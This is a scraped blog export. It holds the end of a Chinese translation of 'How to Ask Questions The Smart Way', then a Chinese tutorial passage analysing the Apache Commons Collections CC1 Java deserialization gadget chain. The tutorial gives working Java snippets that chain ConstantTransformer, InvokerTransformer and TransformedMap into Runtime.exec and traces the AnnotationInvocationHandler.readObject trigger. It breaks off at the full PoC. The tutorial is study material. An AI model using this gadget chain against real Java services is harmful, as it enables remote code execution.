Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实上，张贴诸如紧急：帮我救救这个毛茸茸的小海豹！肯定让你被黑客忽略或惹恼他们，即使他们认为毛茸茸的小海豹很重要。\n如果你觉得这点很不可思议，最好再把这份指南剩下的内容多读几遍，直到你弄懂了再发文。\n礼多人不怪，而且有时还很有帮助 彬彬有礼，多用请和谢谢您的关注，或谢谢你的关照。让大家都知道你对他们花时间免费提供帮助心存感激。\n坦白说，这一点并没有比使用清晰、正确、精准且合乎语法和避免使用专用格式重要（也不能取而代之）。黑客们一般宁可读有点唐突但技术上鲜明的 Bug 报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教给我们什么来评价问题的价值的）\n然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。\n（我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一条。一些黑客觉得先谢了意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说先谢了，然后事后再对回复者表示感谢，或者换种方式表达感激，譬如用谢谢你的关注或谢谢你的关照。）\n问题解决后，加个简短的补充说明 问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。\n最理想的方式是向最初提问的话题回复此消息，并在标题中包含已修正，已解决或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串问题 X和问题 X - 已解决的潜在回复者就明白不用再浪费时间了（除非他个人觉得问题 X有趣），因此可以利用此时间去解决其它问题。\n补充说明不必很长或是很深入；简单的一句你好，原来是网线出了问题！谢谢大家 – Bill比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。\n对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题，在此之后才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。\n除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表/新闻群组/论坛中搜索到真正解决你问题的方案，让他们也从中受益。\n至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。\n思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。\n在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。\n如何解读答案 RTFM 和 STFW：如何知道你已完全搞砸了 有一个古老而神圣的传统：如果你收到RTFM（Read The Fucking Manual）的回应，回答者认为你应该去读他妈的手册。当然，基本上他是对的，你应该去读一读。\nRTFM 有一个年轻的亲戚。如果你收到STFW（Search The Fucking Web）的回应，回答者认为你应该到他妈的网上搜索。那人多半也是对的，去搜索一下吧。（更温和一点的说法是 Google 是你的朋友！）\n在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。\n通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为：\n你需要的信息非常容易获得； 你自己去搜索这些信息比灌给你，能让你学到更多。 你不应该因此不爽；依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见。你应该对他祖母般的慈祥表示感谢。\n如果还是搞不懂 如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了点什么。\n比方说，如果我回答你：看来似乎是 zentry 卡住了；你应该先清除它。，然后，这是一个很糟的后续问题回应：zentry 是什么？ 好的问法应该是这样：哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？\n处理无礼的回应 很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直截了当，一针见血式的交流风格，这种风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。\n如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的前辈多半会招呼他。如果这没有发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而你将被视为有错的一方，这将伤害到你获取信息或帮助的机会。\n另一方面，你偶尔真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。\n（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会正常交往所需的神经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们喜欢我们现在这个样子，并且通常对病患标记都有站得住脚的怀疑。）\nJeff Bigler 的观察总结和这个相关也值得一读 (tact filters)。\n在下一节，我们会谈到另一个问题，当你行为不当时所会受到的冒犯。\n如何避免扮演失败者 在黑客社区的论坛中，你以本指南所描述的或类似的方式，可能会有那么几次搞砸了。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。\n这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被言语攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、不去关马桶盖等等。相反地，你该这么做：\n熬过去，这很正常。事实上，它是有益健康且合理的。\n社区的标准不会自行维持，它们是通过参与者积极而公开地执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。\n也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称如果你不想帮助用户就闭嘴。 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的唠叨与无用的技术论坛。\n夸张的讲法是：你要的是“友善”（以上述方式）还是有用？两个里面挑一个。\n记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心你和他的社区而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现得有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像对待脆弱的洋娃娃那样对你。\n有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是真的会把问题搞砸。\n这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这点你不用操心。\n也别让自己卷入口水战，最好不要理睬大多数的口水战 —— 当然，这是在你检验它们只是口水战，并且未指出你有搞砸的地方，同时也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。\n不该问的问题 以下是几个经典蠢问题，以及黑客没回答时心中所想的：\n问题：我能在哪找到 X 程序或 X 资源？\n问题：我怎样用 X 做 Y？\n问题：如何设定我的 shell 提示？\n问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文件转换为 TeX 格式吗？\n问题：我的程序/设定/SQL 语句没有用\n问题：我的 Windows 电脑有问题，你能帮我吗？\n问题：我的程序不会动了，我认为系统工具 X 有问题\n问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？\n问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？\n问题：我能在哪找到 X 程序或 X 资源？\n回答：就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 Google 吗？\n问题：我怎样用 X 做 Y？\n回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。\n问题：如何设定我的 shell 提示？？\n回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 RTFM，然后自己去找出来。\n问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文件转换为 TeX 格式吗？\n回答：试试看就知道了。如果你试过，你就知道了答案，就不用浪费我的时间了。\n问题：我的{程序/设定/SQL 语句}没有用\n回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 —— 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种\n你还有什么要补充的吗？ 真糟糕，希望你能搞定。 这关我屁事？ 问题：我的 Windows 电脑有问题，你能帮我吗？\n回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧。\n注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你可以问与 Windows 相关的问题，只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。\n问题：我的程序不会动了，我认为系统工具 X 有问题\n回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库文件有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。\n问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？\n回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在这儿找到用户群组的清单）。\n注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地用户群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 Linux 和所有被怀疑的硬件作关键词仔细搜索。\n问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？\n回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！\n好问题与蠢问题 最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。\n蠢问题：\n我可以在哪儿找到关于 Foonly Flurbamatic 的资料？\n这种问法无非想得到 STFW 这样的回答。\n聪明问题：\n我用 Google 搜索过 \u0026ldquo;Foonly Flurbamatic 2600\u0026rdquo;，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？\n这个问题已经 STFW 过了，看起来他真的遇到了麻烦。\n蠢问题：\n我从 foo 项目找来的源码没法编译。它怎么这么烂？\n他觉得都是别人的错，这个傲慢自大的提问者。\n聪明问题：\nfoo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？\n提问者已经指明了环境，也读过了 FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的问题值得被关注。\n蠢问题：\n我的主机板有问题了，谁来帮我？\n某黑客对这类问题的回答通常是：好的，还要帮你拍拍背和换尿布吗？，然后按下删除键。\n聪明问题：\n我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？\n这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。\n在最后一个问题中，注意告诉我答案和给我启示，指出我还应该做什么诊断工作之间微妙而又重要的区别。\n事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我（Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员们提供了解决这一问题的重要信息。\n通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他们再浪费时间，我也表明了对他们宝贵时间的尊重。\n事后，当我向每个人表示感谢，并且赞赏这次良好的讨论经历的时候，一个 Linux 内核邮件列表的成员表示，他觉得我的问题得到解决并非由于我是这个列表中的名人，而是因为我用了正确的方式来提问。\n黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我像个乞讨者那样提问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出现。\n如果得不到回答 如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。\n总的来说，简单地重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。\n你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。\n有许多网上的以及本地的用户群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。\n另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了 —— 完全可能如此 —— 你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。\n对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名用户。根本不可能由一个人来处理来自上万名用户的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开源软件的要高得多，且内容也没那么丰富）。\n如何更好地回答问题 态度和善一点。 问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。\n对初犯者私下回复。 对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。\n如果你不确定，一定要说出来！ 一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。\n如果帮不了忙，也别妨碍他。 不要在实际步骤上开玩笑，那样也许会毁了提问者的设置 —— 有些可怜的呆瓜会把它当成真的指令。\n试探性的反问以引出更多的细节。 如果你做得好，提问者可以学到点东西 —— 你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。\n尽管对那些懒虫抱怨一声 RTFM 是正当的，但能给出文档的链接（即使只是建议个 Google 搜索关键词）会更好。\n如果你决定回答，就请给出好的答案。 当别人正在用错误的工具或方法时别建议笨拙的权宜之计（workaround），应推荐更好的工具，重新界定问题。\n正面地回答问题！ 如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 试试看 A 或是 B 或者 试试 X 、 Y 、 Z 、 A 、 B 、 C 并附上一个链接一点用都没有。\n帮助你的社区从问题中学习。 当回复一个好问题时，问问自己如何修改相关文件或常见问题文件以免再次解答同样的问题？，接着再向文件维护者发一份补丁。\n如果你在研究一番后才作出了回答，展现你的技巧而不是直接端出结果。毕竟授人以鱼不如授人以渔。\n相关资源 如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅 Unix 系统和网络基本原理。\n当你发布软件或补丁时，试着按软件发布实践操作。\n鸣谢 Evelyn Mitchel 贡献了一些愚蠢问题例子并启发了编写如何更好地回答问题这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。\n","date":"2024-07-27T01:19:29+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240727012057978.png","permalink":"https://d4n-sec.github.io/p/how-to-ask-questions-the-smart-way/","title":"How to Ask Questions The Smart Way"},{"content":"假设读者已经掌握（笔者博客里的前置文章内涉及技术的）基础知识\n本文章目的是分析CC链之1 Demo，以及补充相关前置知识，并尝试解决CC1链必要性问题，即CC1的必要路径和可选路径\n笔者的思维路径为深度优先为主，广度为辅的Mindset，如果理解相关知识点，可跳过某些小章节以提升阅读效率。\nCC链1 Demo 简易例子 首先来一个佬的最简化CC链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } 其中没见过 transformer ，TransformedMap\n接下来尝试理解他们的设计理念与意图\nTransformer 直译：变形生成器\nJava中的Transformer：是一个在org.apache.commons.collections.Transformer里的接口\n源码\n1 2 3 public interface Transformer { public Object transform(Object input); } 相关接口必须实现transform方法\n作用：从IDEA的注释中可以了解到 将输入对象（保持不变）转换为某个输出对象\n输入输出 参数：输入要转换的对象，应保持不变\n返回值：变换后的对象\n异常处理 如果输入是错误的类，抛出 ClassCastException（运行时）错误 如果输入无效，抛出 IllegalArgumentException（运行时）错误 如果无法完成转换，抛出 FunctorException（运行时）错误 结合输入输出以及注释解释，我们可以有一个基本的概念\nTransformer 差不多应该是一个转换器接口，而且是用来转换对象用的\n如下是实现了该接口的相关类\n我们可以尝试查看几个相关类对于transform方法的具体实现（也是之后可能会用到的Transformer实现类）\nInvokerTransformer 类结构 源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public Object transform(Object input) { ... Class cls = input.getClass(); //获取input的Class对象 Method method = cls.getMethod(iMethodName, iParamTypes); //根据Str:iMethodName 和 一系列类型，确定唯一的 Method //iMethodName确定Method名称，iParamTypes确定Method参数类型 //如此设计是为了防止Method重载 return method.invoke(input, iArgs); //执行input类中名为$iMethodName的方法，传入参数$iArgs ... } 核心代码就三行，功能已经注释出来，其中$iArgs，$iParamTypes，$iParamTypes在InvokerTransformer类对象创建的时候确定\n利用角度 所以如果要进行命令执行，达到Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;);的效果的话，转换为InvokerTransformer中transform方法的使用方式是\n1 2 3 4 5 6 7 8 9 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); InvokerTransformer invokerTransformer = new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc\u0026#34;} ); invokerTransformer.transform(Runtime.getRuntime()); } MapTransformer 类结构 源码 1 2 3 4 public Object transform(Object input) { return iMap.get(input); //从$iMap中拿出key值为$input的value } 利用角度 通过例子了解原理即可，实际使用会结合其他Gadget使用\n1 2 3 4 5 6 7 8 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); HashMap\u0026lt;String,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;key\u0026#34;,Runtime.getRuntime()); Transformer transform = MapTransformer.getInstance(map); Runtime runtime = (Runtime) transform.transform(\u0026#34;key\u0026#34;); runtime.exec(\u0026#34;calc\u0026#34;); } ConstantTransformer 类结构 源码 1 2 3 4 public Object transform(Object input) { return iConstant; //不管输入，直接返回对象初始化时确定的值 } 利用角度 没什么利用角度，常数设置器一样的，可能对绕过有帮助？\nChainedTransformer 类结构 源码 1 2 3 4 5 6 7 8 9 10 11 public Object transform(Object object) { for (int i = 0; i \u0026lt; iTransformers.length; i++) { //因为$iTransformers是一个List，所以循环遍历所有$iTransformers中的iTransformer object = iTransformers[i].transform(object); //每一个iTransformer都要运行iTransformer自身的transform方法 //并把结果保存到object中，且object是下个iTransformer.transform方法的参数 } return object; //返回最后一个object } 利用角度 ChainedTransformer的transform方法实现很反直觉，所以其设计缘由值得思考，但目前没找到相关参考资料，按照IDEA中的注释可以解释为：\nFactory method that performs validation and copies the parameter array.\n一个工厂方法，这个方法可以验证和拷贝参数数组 \u0026mdash; （中的内容？）\n此类的利用角度已经曝光多年，不过现在看来还是不得不感叹安全研究员的思维敏锐程度\n如下是简单例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); Transformer chainedTransformer = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;} ), } ); chainedTransformer.transform(Runtime.class); } 流程示意图 ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串\n在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊。\nTransformedMap 类结构 由结构可知，该类只开放了三个方法供外界使用put，putAll，decorate\nTransformedMap.decorate 1 2 3 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } 构造函数的开放方法\nTransformedMap.put \u0026amp; TransformedMap.putall put\n1 2 3 4 5 public Object put(Object key, Object value) { key = transformKey(key); value = transformValue(value); return getMap().put(key, value); } 可以看到放入key和value的时候会使用transformKey,transformValue对Key和Value进行处理\nputall\n1 2 3 4 public void putAll(Map mapToCopy) { mapToCopy = transformMap(mapToCopy); getMap().putAll(mapToCopy); } 其transformMap源码如下\n1 2 3 4 5 6 7 8 9 10 11 protected Map transformMap(Map map) { Map result = new LinkedMap(map.size()); for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) { Map.Entry entry = (Map.Entry) it.next(); result.put( transformKey(entry.getKey()), transformValue(entry.getValue()) ); } return result; } 可以看到本质还是使用这两个函数进行处理transformKey,transformValue\n1 2 3 4 5 6 7 8 9 10 11 12 13 protected Object transformKey(Object object) { if (keyTransformer == null) { return object; } return keyTransformer.transform(object); } protected Object transformValue(Object object) { if (valueTransformer == null) { return object; } return valueTransformer.transform(object); } 从上面可以看到transformKey,transformValue只是单纯调用transform方法罢了\n整理下来，TransformedMap做了什么事儿？\nTransformedMap这个类构造对象时，会传入Map map, Transformer keyTransformer, Transformer valueTransformer\n构造好后，再向对象中put Key Value时，会使用原先配置好的key/valueTransformer对key/value分别进行处理，将处理后的key/value值放入map中\n如大佬所说\nTransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可\n以执⾏⼀个回调。\nTransformedMap是Map的功能扩展类！！\n简易例子的理解 回到大佬的简易例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } 首先1-10配置ChainedTransformer，以此放好触发的最终执行环境\n11-13配置TransformedMap，以此触发ChainedTransformer，\n14 放入数据，触发TransformedMap机制。\n完整POC的开端 不过如果只是到这里的话，没法形成完整的利用链路，目前我们的知识点能穿起来的线路如下\nreadObject() \u0026mdash;\u0026gt; \u0026hellip;\u0026hellip;. \u0026mdash;\u0026gt; HashMap \u0026mdash;\u0026gt; TransformedMap \u0026mdash;\u0026gt; ChainedTransformer \u0026mdash;\u0026gt; RCE\n从反序列化入口，到RCE的链路不完整，借用佬的话\n我们前面说过，触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(\u0026ldquo;test\u0026rdquo;, \u0026ldquo;xxxx\u0026rdquo;); 来触发漏洞，但在实际反序列化时，我们需要找到一个类，它在反序列化的readObject逻辑里有类似的写入操作。这个类就是sun.reflect.annotation.AnnotationInvocationHandler\nAnnotation即注解，大部分情况下，开发者是使用Annotation而不是编写Annotation，所以暂时不做展开学习\nAnnotationInvocationHandler.readObject的源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } } 其中触发语句是26行的memberValue.setValue()，此时的memberValue为AbstractInputCheckedMapDecorator类的静态内部类MapEntry,此类的源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 static class MapEntry extends AbstractMapEntryDecorator { /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); } } setValue()会调用parent.checkSetValue()，由上方第4行可知parent为AbstractInputCheckedMapDecorator类，即父类\n所以setValue()会调用AbstractInputCheckedMapDecorator类的checkSetValue()方法\n又刚好，TransformedMap是AbstractInputCheckedMapDecorator的抽象类实现，实现了抽象方法checkSetValue()\n有趣的是，TransformedMap.checkSetValue()只在上方提到的内部静态类AbstractInputCheckedMapDecorator.MapEntry中被调用过\nTransformedMap.checkSetValue()的源码如下\n1 2 3 protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } 会调用valueTransformer.transform()，而valueTransformer在简单例子中的第12行已经被设置为触发RCE的transformers了\n所以！！！！！AbstractInputCheckedMapDecorator.MapEntry.parent被设置为TransformedMap即可补齐链条，如下是调用栈。\n1 2 3 4 ChainedTransformer.transform() TransformedMap.checkSetValue() AbstractInputCheckedMapDecorator$MapEntry.setValue() AnnotationInvocationHandler.readObject() 当ChainedTransformer.transform()被调用的时候，即可RCE\n先入为主的解释 初学者的学习阶段只需要理解这样做为什么可行，而暂时搁置为什么一定/需要这样做的原因\nAbstractInputCheckedMapDecorator.MapEntry.parent如何被设置为TransformedMap的呢？\nmemberValues来源于该类的构造函数，构造函数为声明为 1 AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; type, Map\u0026lt;String, Object\u0026gt; memberValues) 所以memberValues是一个实现了Map接口的类，我们设置的outerMap完美符合这个要求\n直接使用构造函数将outerMap传递给memberValues即可\nAnnotationInvocationHandler.readObject()中将memberValues.entrySet()的结果当做迭代器访问，如下 1 for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) 此时memberValues.entrySet()会返回内部类AbstractInputCheckedMapDecorator.EntrySet，如下\n1 2 3 4 5 public Set entrySet() { ... return new EntrySet(map.entrySet(), this); ... } 对内部类AbstractInputCheckedMapDecorator.EntrySet当做迭代器访问时，会触发memberValues.iterator()返回迭代器，AbstractInputCheckedMapDecorator.EntrySet.iterator()源码如下\n1 2 3 public Iterator iterator() { return new EntrySetIterator(collection.iterator(), parent); } 实际上每次返回的迭代器是内部类AbstractInputCheckedMapDecorator.EntrySetIterator，每次迭代器被访问时会访问next()，AbstractInputCheckedMapDecorator.EntrySetIterator.next()源码如下\n1 2 3 4 public Object next() { Map.Entry entry = (Map.Entry) iterator.next(); return new MapEntry(entry, parent); } 每次都会返回内部类AbstractInputCheckedMapDecorator.MapEntry，所以memberValue即AbstractInputCheckedMapDecorator.MapEntry。\n每次memberValue都会访问parent.checkSetValue() \u0026mdash;\u0026gt; 即memberValues.checkSetValue() \u0026mdash;\u0026gt; 即outerMap.checkSetValue() \u0026mdash;\u0026gt; 即TransformedMap.checkSetValue()\n至此，形成RCE链路。\n制作完整POC Demo 简易例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } 注释掉14行手动触发\n添加代码，构造AnnotationInvocationHandler对象，并将其反序列化，然后手动触发反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 